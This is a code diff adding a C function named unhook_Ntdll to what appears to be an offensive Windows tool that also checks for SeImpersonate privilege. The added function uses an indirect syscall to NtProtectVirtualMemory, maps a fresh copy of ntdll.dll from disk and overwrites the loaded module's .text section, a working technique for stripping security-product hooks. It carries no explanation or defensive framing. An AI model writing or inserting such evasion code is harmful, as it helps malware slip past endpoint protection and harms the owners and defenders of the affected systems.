@@ -176,3 +176,48 @@ BOOL check_seimpersonate() {
     HeapFree(GetProcessHeap(), 0, ptp);
     return 0;
 }
+
+BOOL unhook_Ntdll() {
+    g_ssn = getSSN("NtProtectVirtualMemory");
+    g_syscall = getSyscallAddr("NtProtectVirtualMemory");
+
+    HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll",
+        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return 0;
+
+    HANDLE hMap = CreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
+    if (!hMap) { CloseHandle(hFile); return 0; }
+
+    PVOID pDisk = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
+    if (!pDisk) { CloseHandle(hMap); CloseHandle(hFile); return 0; }
+
+    HMODULE hMem = GetModuleHandleW(L"ntdll.dll");
+    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)hMem;
+    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)hMem + dos->e_lfanew);
+    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
+
+    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
+        if (RtlCompareMemory(sec->Name, ".text", 5) == 5) {
+            PVOID dst = (PVOID)((BYTE*)hMem + sec->VirtualAddress);
+            PVOID src = (PVOID)((BYTE*)pDisk + sec->PointerToRawData);
+            DWORD size = sec->SizeOfRawData;
+            PVOID base = dst;
+            SIZE_T sz = size;
+            DWORD old = 0;
+            iNtProtectVirtualMemory(GetCurrentProcess(), &base, &sz, PAGE_EXECUTE_READWRITE, &old);
+            RtlCopyMemory(dst, src, size);
+            FlushInstructionCache(GetCurrentProcess(), dst, size);
+            iNtProtectVirtualMemory(GetCurrentProcess(), &base, &sz, old, &old);
+            UnmapViewOfFile(pDisk);
+            CloseHandle(hMap);
+            CloseHandle(hFile);
+            printf("[x] Ntdll Unhooked!\n");
+            return 1;
+        }
+    }
+
+    UnmapViewOfFile(pDisk);
+    CloseHandle(hMap);
+    CloseHandle(hFile);
+    return 0;
+}
